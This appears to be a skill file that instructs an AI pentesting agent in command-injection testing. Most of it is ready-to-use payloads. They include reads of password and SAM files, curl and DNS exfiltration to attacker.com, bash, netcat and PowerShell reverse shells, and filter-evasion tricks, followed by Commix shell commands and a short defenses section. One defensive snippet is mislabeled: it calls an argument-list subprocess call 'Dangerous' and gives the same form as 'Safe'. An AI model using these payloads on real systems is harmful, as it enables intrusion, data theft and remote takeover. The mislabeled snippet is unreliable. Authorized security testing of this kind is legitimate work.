---
name: command-injection-testing
description: Professional skills and methodology for command-injection vulnerability testing
version: 1.0.0
---

# Command-Injection Vulnerability Testing

## Overview

Command injection is a vulnerability that lets an application execute system commands. When an application passes user input straight into a system command, an attacker can run arbitrary commands. This skill provides detection, exploitation, and defense methods for command injection.

## How it works

The application invokes system commands without adequately validating and filtering user input, letting an attacker inject additional commands.

**Dangerous code examples:**
```php
// PHP
system("ping " . $_GET['ip']);

// Python
os.system("ping " + user_input)

// Node.js
child_process.exec("ping " + user_input)
```

## Testing methodology

### 1. Identify command-execution points

**Common features:**
- Ping tools
- DNS lookups
- File operations
- System info
- Log viewers
- Backup/restore

### 2. Basic detection

**Test command separators:**
```
;  # command separator (Linux/Windows)
&  # background execution (Linux/Windows)
|  # pipe (Linux/Windows)
&& # logical AND (Linux/Windows)
|| # logical OR (Linux/Windows)
`  # command substitution (Linux)
$() # command substitution (Linux)
```

**Test payloads:**
```
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 `whoami`
127.0.0.1 $(whoami)
```

### 3. Blind command injection

**Time-delay detection:**
```
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5
```

**Out-of-band data exfiltration:**
```
127.0.0.1; curl http://attacker.com/?$(whoami)
127.0.0.1 && wget http://attacker.com/$(cat /etc/passwd)
```

**DNS exfiltration:**
```
127.0.0.1; nslookup $(whoami).attacker.com
```

## Exploitation techniques

### Basic command execution

**Linux:**
```
; id
; whoami
; uname -a
; cat /etc/passwd
; ls -la
```

**Windows:**
```
& whoami
& ipconfig
& type C:\Windows\System32\drivers\etc\hosts
& dir
```

### File operations

**Read files:**
```
; cat /etc/passwd
; type C:\Windows\System32\config\sam
; head -n 20 /var/log/apache2/access.log
```

**Write files:**
```
; echo "<?php phpinfo(); ?>" > /tmp/shell.php
; echo "test" > C:\temp\test.txt
```

### Reverse shells

**Bash:**
```
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Netcat:**
```
; nc -e /bin/bash attacker.com 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

**PowerShell:**
```
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Bypass techniques

### Space bypass

```
${IFS}id
${IFS}whoami
$IFS$9id
<>
%09 (Tab)
%20 (Space)
```

### Command-separator bypass

**Encoding bypass:**
```
%3b (;)
%26 (&)
%7c (|)
```

**Newline bypass:**
```
%0a (newline)
%0d (carriage return)
```

### Keyword-filter bypass

**Variable concatenation:**
```bash
a=w;b=ho;c=ami;$a$b$c
```

**Wildcards:**
```bash
/bin/c?t /etc/passwd
/usr/bin/ca* /etc/passwd
```

**Quote bypass:**
```bash
w'h'o'a'm'i
w"h"o"a"m"i
```

**Backslashes:**
```bash
w\ho\am\i
```

**Base64 encoding:**
```bash
echo "d2hvYW1p" | base64 -d | bash
```

### Length-limit bypass

**Use a file:**
```bash
echo "id" > /tmp/c
sh /tmp/c
```

**Use environment variables:**
```bash
export x='id';$x
```

## Tool usage

### Commix

```bash
# Basic scan
python commix.py -u "http://target.com/ping?ip=127.0.0.1"

# Specify the injection point
python commix.py -u "http://target.com/ping?ip=INJECT_HERE" --data="ip=INJECT_HERE"

# Get a shell
python commix.py -u "http://target.com/ping?ip=127.0.0.1" --os-shell
```

### Burp Suite

1. Intercept the request
2. Send to Intruder
3. Use a command-injection payload list
4. Watch responses or time delays

## Verification and reporting

### Verification steps

1. Confirm that system commands execute
2. Verify the command output
3. Assess impact (system control, data exfiltration, etc.)
4. Record a complete PoC
5. Log the confirmed vulnerability via the `report_finding` tool (the platform's sole entry point for recording vulnerabilities), covering location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting essentials

- Vulnerability location and input parameter
- Types of commands that can execute
- Complete exploitation steps and PoC
- Remediation advice (input validation, parameterization, allowlists, etc.)

## Defenses

### Recommended

1. **Avoid command execution**
   - Use APIs instead of system commands
   - Use library functions instead of commands

2. **Input validation**
   ```python
   import re
   
   def validate_ip(ip):
       pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
       if not re.match(pattern, ip):
           raise ValueError("Invalid IP")
       parts = ip.split('.')
       if not all(0 <= int(p) <= 255 for p in parts):
           raise ValueError("Invalid IP range")
       return ip
   ```

3. **Parameterized commands**
   ```python
   import subprocess
   
   # Dangerous
   subprocess.call(['ping', '-c', '1', user_input])
   
   # Safe — argument list
   subprocess.call(['ping', '-c', '1', validated_ip])
   ```

4. **Allowlist validation**
   ```python
   ALLOWED_COMMANDS = ['ping', 'nslookup']
   ALLOWED_OPTIONS = {'ping': ['-c', '-n']}
   
   if command not in ALLOWED_COMMANDS:
       raise ValueError("Command not allowed")
   ```

5. **Least privilege**
   - Run the app under a low-privilege user
   - Restrict filesystem access
   - Use chroot or container isolation

6. **Output filtering**
   - Limit output content
   - Filter sensitive information
   - Log command execution

## Notes

- Test only in authorized environments
- Avoid damaging the system
- Mind command differences across operating systems
- Watch the blast radius of executed commands while testing
